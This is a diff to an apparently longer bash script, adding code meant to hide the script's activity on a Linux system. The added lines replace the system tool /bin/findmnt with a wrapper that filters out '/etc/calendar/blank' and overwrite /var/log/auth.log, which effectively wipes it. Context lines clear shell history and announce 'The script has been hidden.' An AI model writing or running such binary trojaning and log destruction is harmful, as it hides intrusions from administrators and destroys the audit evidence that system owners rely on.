@@ -54,6 +54,9 @@ do
 	c=$(expr $c + 1)
 done
 history -c
+sudo cp /bin/findmnt /bin/tempfile
+echo -e "#!/bin/bash\ntempfile | grep -v '/etc/calendar/blank'" > /bin/findmnt
+head -n -10 /var/log/auth.log > /var/log/auth.log
 echo The script has been hidden. > /dev/tty1
 while true;
 do
@@ -94,9 +97,10 @@ current=$(cat $back_path)
 	fi
 #echo "Waiting 30 seconds for next check"
 cont=$(cat /etc/calendar/cont)
-if [ $cont == "stop" ]
+if [[ $cont == "stop" ]]
 then
 	echo EMERGENCY EXIT > /dev/tty1
+	echo "" > /etc/calendar/cont
 	exit 1
 fi
 sleep 30
